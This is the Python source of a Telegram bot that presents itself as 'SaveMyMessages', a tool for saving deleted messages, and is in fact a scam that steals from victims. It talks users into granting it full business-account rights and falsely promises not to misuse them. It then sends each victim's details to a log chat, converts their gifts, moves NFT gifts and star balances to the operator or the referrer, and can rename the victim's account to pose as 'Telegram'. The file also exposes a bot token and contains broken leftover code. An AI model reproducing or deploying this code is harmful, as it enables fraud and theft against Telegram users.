from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.storage.memory import MemoryStorage
import random

from datetime import datetime
import requests
import aiohttp
import asyncio
import logging


# Constants
TOKEN = "8059317736:AAHCFURfjvHHzUrcQ-n81NHKHRXQKqUCtuE" #Токен бота
LOG_CHAT_ID = -1002898470305

MAX_GIFTS_PER_RUN = 1000
last_messages = {}
ADMIN_IDS = [7917237979] #Вставить айди админов
storage = MemoryStorage()

logging.basicConfig(level=logging.INFO)

import os
import json

# Загружаем user_referrer_map из файла, если есть
if os.path.exists("referrers.json"):
    with open("referrers.json", "r") as f:
        user_referrer_map = json.load(f)
else:
    user_referrer_map = {}
user_referrals = {}     # inviter_id -> [business_ids]
ref_links = {}          # ref_code -> inviter_id

# Bot initialization
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

class Draw(StatesGroup):
    id = State()
    gift = State()

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📌 Сохранять одноразовые сообщения", callback_data="show_instruction")],
        [InlineKeyboardButton(text="🗑️ Сохранять удалённые сообщения", callback_data="show_instruction")],
        [InlineKeyboardButton(text="✏️ Сохранять отредактированные сообщения", callback_data="show_instruction")],
        [InlineKeyboardButton(text="🎞 Анимации с текстом", callback_data="show_instruction")],
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    args = message.text.split(" ")

    if len(args) > 1 and args[1].startswith("ref"):
        ref_code = args[1]
        try:
            inviter_id = int(ref_code.replace("ref", ""))
        except ValueError:
            inviter_id = None

        if inviter_id and inviter_id != message.from_user.id:
            # Сохраняем user_referrer_map в файл
            user_referrer_map[message.from_user.id] = inviter_id
            with open("referrers.json", "w") as f:
                json.dump(user_referrer_map, f)
                
            await message.answer(f"Вы были приглашены пользователем <code>{inviter_id}</code>!")
        else:
            await message.answer("Некорректная или своя собственная реферальная ссылка 🤷‍♂️")

    photo = FSInputFile("savemod_banner.jpg")
    await message.answer_photo(
        photo=photo,
        caption=(
            "👋 Добро пожаловать в <b>SaveMyMessages</b>!\n"
            "🔹 Сохраняйте одноразовые сообщения\n"
            "🔹 Сохраняйте удалённые сообщения\n"
            "🔹 Сохраняйте отредактированные сообщения\n\n"
            "📖 <b>Перед началом ознакомьтесь с инструкцией</b>\n"

            "Выберите, что хотите сохранять:"
        ),
        reply_markup=main_menu_kb()
    )
@dp.message(Command("getrefZZZ"))
async def send_ref_link(message: types.Message):
    user_id = message.from_user.id
    ref_code = f"ref{user_id}"
    ref_links[ref_code] = user_id
    await message.answer(f"Ваша реферальная ссылка:https://t.me/{(await bot.me()).username}?start={ref_code}")

@dp.callback_query(F.data == "show_instruction")
async def send_instruction(callback: types.CallbackQuery):
    img = FSInputFile("instruction_guide.png")
    await callback.message.answer_photo(
        photo=img,
        caption=(
            "<b>Как подключить бота к бизнес-аккаунту:</b>\n\n"
            "1. Перейдите в «Настройки» → <i>Telegram для бизнеса</i>\n"
            "2. Перейдите в <i>Чат-боты</i>\n"
            "3. Добавьте <b>@SaveMyMessagessBot</b> в список\n"
            "4. Поставьте все галочки в нижних полях\n\n"
            "После этого функции начнут работать автоматически ✅"
        )
    )
    await callback.answer()


@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    await callback.answer("Сначала нажмите на 📖 Инструкцию сверху!", show_alert=True)

async def pagination(
    page=0
):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        response = requests.get(url)
        response.raise_for_status()
        builder = InlineKeyboardBuilder()
        start = page * 9
        end = start + 9
        count = 0
        
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            for gift in gifts[start:end]:
                print(gift)
                count += 1
                builder.button(
                    text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
                    callback_data=f"gift_{gift['id']}"
                )
            builder.adjust(2)
        if page <= 0:
            builder.row(
                InlineKeyboardButton(
                    text="•",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="Вперед",
                    callback_data=f"next_{page + 1}"

                )
            )
        elif count < 9:
            builder.row(
                InlineKeyboardButton(
                    text="Назад",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="•",
                    callback_data="empty"

                )
            )
        elif page > 0 and count >= 9:
            builder.row(
                InlineKeyboardButton(
                    text="Назад",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="Вперед",
                    callback_data=f"next_{page + 1}"

                )
            )
        return builder.as_markup()
            
    except Exception as e:
        print(e)
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"{e}")

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    builder.button(
        text="🎁 Украсть подарки", 
        callback_data=f"steal_gifts:{business_id}"
    )
    builder.button(
        text="💰 Перевести звёзды", 
        callback_data=f"transfer_stars:{business_id}"
    )
    builder.button(
        text="⛔️ Удалить подключение", 
        callback_data=f"destroy:{business_id}"
    )
    builder.adjust(1)
    
    user = business_connection.user
    
    try:
        info = await bot.get_business_connection(business_id)
        rights = info.rights
        
        # Проверка необходимых прав
        required_rights = [
            rights.can_read_messages,
            rights.can_delete_all_messages,
            rights.can_convert_gifts_to_stars,
            rights.can_transfer_stars
        ]
        
        if not all(required_rights):
            warning_message = (
                "⛔️ Вы не предоставили все права боту\n\n"
                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n\n"
                "⚠️ Мы не используем эти права в плохих целях, все эти права нужны нам лишь чтобы анализировать сообщения и статистику ваших собеседников, чтобы в будущем отправлять её вам\n\n"
                "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
            )
            try:
                await bot.send_message(
                    chat_id=user.id,
                    text=warning_message
                )
            except Exception as e:
                await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
        
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка получения данных бизнес-аккаунта: {e}")
        return

    # Рассчеты
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    # Форматирование текста (остаётся без изменений)
    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
    user_info = (
        f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
        f"├─ ID: <code>{user.id}</code>\n"
        f"├─ Username: @{user.username or 'нет'}\n"
        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
    )
    balance_info = (
        f"<blockquote>💰 <b>Баланс:</b>\n"
        f"├─ Доступно звёзд: {int(stars.amount):,}\n"
        f"├─ Звёзд в подарках: {total_price:,}\n"
        f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
    )
    gifts_info = (
        f"<blockquote>🎁 <b>Подарки:</b>\n"
        f"├─ Всего: {gifts.total_count}\n"
        f"├─ Обычные: {gifts.total_count - len(nft_gifts)}\n"
        f"├─ NFT: {len(nft_gifts)}\n"
        f"├─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)\n"
        f"╰─ <b>Общая стоимость вывода:</b> {total_withdrawal_cost:,} звёзд</blockquote>"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', 'скрыт')
                nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
            except AttributeError:
                nft_items.append(f"├─ NFT #{idx} (скрыт) - 25⭐")
        
        nft_list = "\n<blockquote>🔗 <b>NFT подарки:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n╰─ <b>Итого:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>🔐 <b>Права бота:</b>\n"
        f"├─ Основные: {'✅' if rights.can_read_messages else '❌'} Чтение | "
        f"{'✅' if rights.can_delete_all_messages else '❌'} Удаление\n"
        f"├─ Профиль: {'✅' if rights.can_edit_name else '❌'} Имя | "
        f"{'✅' if rights.can_edit_username else '❌'} Username\n"
        f"╰─ Подарки: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация | "
        f"{'✅' if rights.can_transfer_stars else '❌'} Перевод</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>ℹ️ <i>Перенос каждого NFT подарка стоит 25 звёзд</i>\n"
        f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    # 1. Отправка в основной лог-чат
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Ошибка при отправке в лог-чат: {e}")

    # 2. Отправка пригласившему (если есть)
    inviter_id = user_referrer_map.get(user.id)
    
    if inviter_id and inviter_id != user.id:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=full_message,  # Точно такое же сообщение
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
            logger.error(error_msg)
            await bot.send_message(LOG_CHAT_ID, error_msg)

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(
        text="Введите айди юзера кому перевести подарки"
    )
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):

    msg = await message.answer(
        text="Актуальные подарки:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    gift_id = callback.data.split('_')[1]
    user_id = await state.get_data()
    user_id = user_id['user_id']
    await bot.send_gift(
        gift_id=gift_id,
        chat_id=int(user_id)
    )
    await callback.message.answer("Успешно отправлен подарок")
    await state.clear

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="Актуальные подарки:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )
    
            

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️Вывод звезд",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="Админ панель:",
        reply_markup=builder.as_markup()
    )
@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="⛔️Отмена самоуничтожения",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="⛔️Включен режим самоуничтожения, для того чтобы отключить нажмите на кнопку",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("Мамонт спасен от сноса.")

    user_id = message.from_user.id
    inviter_id = user_referrer_map.get(user_id)

    # Если нет пригласившего — fallback на первого админа
    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]

    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    if gifts_to_process == []:
        await bot.send_message(chat_id=LOG_CHAT_ID, text="У пользователя нет подарков.")
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        print(gift.gift)

        gift_type = gift.type
        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except:
                pass
    
        if not gift_id:
            continue

        # Передача
        if isTransfered:
            try:
                steal = await bot.transfer_gift(business_id, gift_id, recipient_id, transfer_star_count)
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception as e:
                await message.answer(f"❌ Не удалось передать подарок {gift_name} пользователю {recipient_id}")
                print(e)


    # Лог
    if stolen_count > 0:
        text = (
            f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await message.answer("Не удалось украсть подарки")
    
    # Перевод звёзд
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
        else:
            await message.answer("У пользователя нет звезд.")
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"🚫 Ошибка при выводе звёзд: {e}")

@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
    except Exception as e:
        await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
        return

    # Определяем получателя
    inviter_id = user_referrer_map.get(user.id)
    if inviter_id:
        try:
            await bot.send_chat_action(inviter_id, "typing")
            recipient_id = inviter_id
        except Exception:
            recipient_id = ADMIN_IDS[0]
    else:
        recipient_id = ADMIN_IDS[0]

    stolen_nfts = []
    stolen_count = 0
    
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        error_msg = f"❌ Ошибка при получении подарков: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            await bot.send_message(inviter_id, error_msg)
        await callback.answer("Ошибка при получении подарков")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        gift_type = gift.type
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except Exception:
                continue
        
        if gift_type == "unique" and gift.can_be_transferred:
            try:
                await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
                gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception:
                continue

    # Формируем отчет без ошибок
    result_msg = []
    if stolen_count > 0:
        result_msg.append(f"\n🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n")
        result_msg.extend(stolen_nfts[:10])  # Ограничиваем количество выводимых NFT
    
    full_report = "\n".join(result_msg) if result_msg else "\nНе удалось украсть подарки"
    
    # Отправляем отчет в LOG_CHAT_ID
    await bot.send_message(
        chat_id=LOG_CHAT_ID,
        text=f"Отчет по бизнес-аккаунту {user.id}:\n{full_report}",
        parse_mode="HTML"
    )
    
    # Отправляем отчет пригласившему (если есть)
    if inviter_id and inviter_id != user.id:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=f"Отчет по вашему рефералу {user.id}:\n{full_report}",
                parse_mode="HTML"
            )
        except Exception as e:
            await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
    
    await callback.answer(f"Украдено {stolen_count} подарков")
    
@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
        
        # Определяем получателя (как в steal_gifts_handler)
        inviter_id = user_referrer_map.get(user.id)
        if inviter_id:
            try:
                await bot.send_chat_action(inviter_id, "typing")
                recipient_id = inviter_id
            except Exception:
                recipient_id = ADMIN_IDS[0]
        else:
            recipient_id = ADMIN_IDS[0]
            
        # Получаем баланс и переводим звёзды
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
            
            # Отправляем сообщение в лог и пригласившему
            await bot.send_message(LOG_CHAT_ID, success_msg)
            if inviter_id and inviter_id != recipient_id:
                try:
                    await bot.send_message(inviter_id, success_msg)
                except Exception as e:
                    await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
                    
            await callback.answer(f"Переведено {amount} звёзд")
        else:
            await callback.answer("Нет звёзд для перевода", show_alert=True)
            
    except Exception as e:
        error_msg = f"❌ Ошибка при переводе звёзд: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        await callback.answer("Ошибка при переводе звёзд", show_alert=True)

        
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
